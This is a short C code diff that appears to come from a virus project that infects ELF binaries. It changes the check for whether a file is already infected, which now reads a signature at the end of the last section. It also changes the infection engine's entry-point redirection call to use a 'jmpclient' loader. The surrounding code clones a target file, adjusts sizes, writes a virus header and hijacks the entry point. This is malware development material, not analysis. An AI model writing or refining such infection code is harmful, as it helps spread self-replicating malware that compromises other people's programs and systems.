@@ -9,10 +9,13 @@
 static bool	not_infected(const struct entry *file_entry,
 			struct safe_ptr file_ref, size_t dist_entry_header)
 {
-	const Elf64_Off	sh_offset        = file_entry->safe_shdr->sh_offset;
-	const size_t	entry_offset     = sh_offset + file_entry->offset_in_section;
-	const size_t	signature_offset = entry_offset + dist_entry_header + sizeof(struct virus_header);
-	const char	 *signature      = safe(file_ref, signature_offset, SIGNATURE_LEN);
+	// const Elf64_Off	sh_offset        = file_entry->safe_shdr->sh_offset;
+	// const size_t	entry_offset     = sh_offset + file_entry->offset_in_section;
+	// const size_t	signature_offset = entry_offset + dist_entry_header + sizeof(struct virus_header);
+	// const char	 *signature      = safe(file_ref, signature_offset, SIGNATURE_LEN);
+
+	const size_t	signature_offset = file_entry->end_of_last_section + sizeof(struct virus_header);
+	const char	*signature = safe(file_ref, signature_offset, SIGNATURE_LEN);
 
 	if (signature == NULL)
 		return errors(ERR_VIRUS, _ERR_V_CANT_READ_SIGNATURE);
@@ -82,7 +85,7 @@ bool		infection_engine(struct virus_header *vhdr,
 	|| !find_entry(&clone_entry, clone_ref)
 	|| !adjust_sizes(&clone_entry, *shift_amount, *full_virus_size)
 	|| !setup_virus_header(clone_ref, *loader_off, *vhdr)
-	|| !change_entry(clone_ref, &file_entry, vhdr->dist_client_loader, seed))
+	|| !change_entry(clone_ref, &file_entry, vhdr->dist_jmpclient_loader))
 		return errors(ERR_THROW, _ERR_T_INFECTION_ENGINE);
 
 	return true;
